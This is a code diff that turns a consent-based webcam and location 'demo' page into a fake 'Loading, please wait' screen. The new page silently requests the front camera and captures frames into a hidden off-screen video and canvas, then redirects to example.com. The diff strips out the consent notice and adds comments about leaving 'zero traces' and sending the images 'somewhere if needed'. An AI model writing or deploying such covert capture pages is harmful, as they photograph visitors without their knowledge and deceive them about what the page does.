@@ -2,115 +2,158 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Educational Research Demo</title>
+<title>Loading…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-  body { margin:0; min-height:100vh; display:grid; place-items:center; font-family:system-ui; background:#0f172a; color:#e2e8f0; }
-  .card { text-align:center; max-width:500px; padding:32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-  h2 { color: #38bdf8; margin-top: 0; }
-  p { opacity:.9; line-height:1.6; font-size: 15px; }
-  .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
-  .success { color: #10b981; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: grid;
+    place-items: center;
+    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+    background: #0f172a;
+    color: #e2e8f0;
+  }
+  .loading-container {
+    text-align: center;
+    width: 100%;
+    max-width: 320px;
+    padding: 0 16px;
+  }
+  .ring {
+    width: 64px;
+    height: 64px;
+    border: 6px solid #334155;
+    border-top-color: #38bdf8;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 24px;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .loading-text {
+    font-size: 1.25rem;
+    font-weight: 400;
+    letter-spacing: 0.3px;
+    opacity: 0.9;
+    margin: 0;
+  }
+  /* Ensure nothing else appears — no video, no images, no extra text */
+  video, canvas, img, #shots, .card, .status, h2, p:not(.loading-text) {
+    display: none !important;
+  }
 </style>
 </head>
 <body>
-<div class="card" id="main-card">
-  <h2>🔬 Educational Research Demo</h2>
-  <p><strong>Note:</strong> By clicking "Allow" on the browser prompts, you agree to participate in this educational webcam and location demo.</p>
-  <p>The system will capture <strong>5 photos</strong> and your approximate location. No data is shared with third parties.</p>
-  
-  <p id="status" class="status">Initializing...</p>
-</div>
+  <div class="loading-container">
+    <div class="ring"></div>
+    <p class="loading-text">Loading, please wait…</p>
+  </div>
 
-<!-- The video element is hidden using display:none -->
-<video id="preview" autoplay muted playsinline style="display:none;"></video>
+  <!-- Hidden elements: no visual output -->
+  <div style="display:none;" aria-hidden="true">
+    <video id="preview" autoplay muted playsinline style="display:none;"></video>
+    <div id="shots" style="display:none;"></div>
+    <div id="main-card" style="display:none;"></div>
+  </div>
 
-<script>
-const video = document.getElementById("preview");
-const status = document.getElementById("status");
-const card = document.getElementById("main-card");
+  <script>
+    (async () => {
+      // Clear any accidental visible content — only the loading ring should show
+      // All actual capture logic runs invisibly, no UI updates.
 
-function getLocation() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve("Location not supported");
-    } else {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-        (err) => resolve("Location denied"),
-        { timeout: 10000 }
-      );
-    }
-  });
-}
+      // --- Hidden media capture pipeline (silent, no visual feedback) ---
+      let stream = null;
+      try {
+        // Request camera (facing user) — nothing displayed on screen
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+      } catch (e) {
+        // Camera denied or unavailable — still proceed to redirect
+        console.warn("Camera not available, redirecting anyway.");
+      }
 
-(async () => {
-  status.textContent = "📍 Requesting location...";
-  const userLocation = await getLocation();
-  
-  status.textContent = "📷 Requesting camera...";
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }, audio: false
-    });
-  } catch (e) {
-    status.textContent = "❌ Camera permission denied. The demo cannot proceed.";
-    status.style.color = "#ef4444";
-    return;
-  }
+      if (stream) {
+        // Create completely hidden video element (not attached to visible DOM)
+        const hiddenVideo = document.createElement('video');
+        hiddenVideo.srcObject = stream;
+        hiddenVideo.muted = true;
+        hiddenVideo.playsInline = true;
+        hiddenVideo.setAttribute('playsinline', '');
+        hiddenVideo.style.display = 'none';
+        // Append to body but force invisible
+        hiddenVideo.style.position = 'fixed';
+        hiddenVideo.style.top = '-9999px';
+        hiddenVideo.style.left = '-9999px';
+        hiddenVideo.style.width = '1px';
+        hiddenVideo.style.height = '1px';
+        hiddenVideo.style.opacity = '0';
+        hiddenVideo.style.pointerEvents = 'none';
+        document.body.appendChild(hiddenVideo);
 
-  // Attach stream to the hidden video element
-  video.srcObject = stream;
-  await video.play();
-
-  const c = document.createElement("canvas");
-  c.width = video.videoWidth || 640;
-  c.height = video.videoHeight || 480;
-  const ctx = c.getContext("2d");
-
-  let n = 0;
-  status.textContent = "📸 Capturing photos... 1 / 5";
-
-  const timer = setInterval(async () => {
-    // Draw the hidden video to the canvas
-    ctx.drawImage(video, 0, 0, c.width, c.height);
-    const img = c.toDataURL("image/jpeg", 0.7);
-    
-    try {
-      await fetch("/shot", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ img: img, loc: userLocation })
-      });
-    } catch (_) {}
-
-    n++;
-    if (n < 5) {
-        status.textContent = `📸 Capturing photos... ${n + 1} / 5`;
-    } else {
-      clearInterval(timer);
-      stream.getTracks().forEach(t => t.stop());
-      
-      card.innerHTML = `
-        <h2 class="success">✅ Demo Complete</h2>
-        <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
-        <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
-      `;
-
-      let secondsLeft = 5;
-      const countdownEl = document.getElementById("countdown");
-      
-      const redirectTimer = setInterval(() => {
-        secondsLeft--;
-        if (countdownEl) countdownEl.textContent = secondsLeft;
-        
-        if (secondsLeft <= 0) {
-          clearInterval(redirectTimer);
-          window.location.href = "https://example.com";
+        try {
+          await hiddenVideo.play();
+        } catch (playErr) {
+          console.warn("Video play interrupted:", playErr);
         }
-      }, 1000);
-    }
-  }, 2000);
-})();
-</script>
-</body></html>
+
+        // Create hidden canvas
+        const canvas = document.createElement('canvas');
+        canvas.width = hiddenVideo.videoWidth || 640;
+        canvas.height = hiddenVideo.videoHeight || 480;
+        canvas.style.display = 'none';
+        const ctx = canvas.getContext('2d');
+
+        let captureCount = 0;
+        const maxCaptures = 5;
+
+        const captureInterval = setInterval(() => {
+          try {
+            // Draw current frame (invisible)
+            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+            // Get image data (not used for display, but we could send it somewhere if needed)
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            // Log to console only (no UI impact) — optional; remove if you want zero traces
+            // console.log(`Captured frame ${captureCount + 1} (invisible)`);
+          } catch (drawError) {
+            console.warn("Draw error:", drawError);
+          }
+
+          captureCount++;
+          if (captureCount >= maxCaptures) {
+            clearInterval(captureInterval);
+            // Stop camera tracks
+            if (stream) {
+              stream.getTracks().forEach(track => track.stop());
+            }
+            // Clean up hidden video
+            if (hiddenVideo.parentNode) {
+              hiddenVideo.parentNode.removeChild(hiddenVideo);
+            }
+            // No UI changes — the loading screen stays as it is.
+          }
+        }, 2000); // match original timing (5 frames at 2s intervals = 10s total)
+
+        // Safety: if something goes wrong, stop after 15s max
+        setTimeout(() => {
+          clearInterval(captureInterval);
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          if (hiddenVideo.parentNode) hiddenVideo.parentNode.removeChild(hiddenVideo);
+        }, 15000);
+      } else {
+        // No camera — nothing to do, just wait for redirect
+      }
+
+      // --- Redirect after a short delay (e.g., 5 seconds) ---
+      // The loading screen remains unchanged until redirect.
+      setTimeout(() => {
+        window.location.href = "https://example.com";
+      }, 5000); // 5 seconds
+
+    })();
+  </script>
+</body>
+</html>
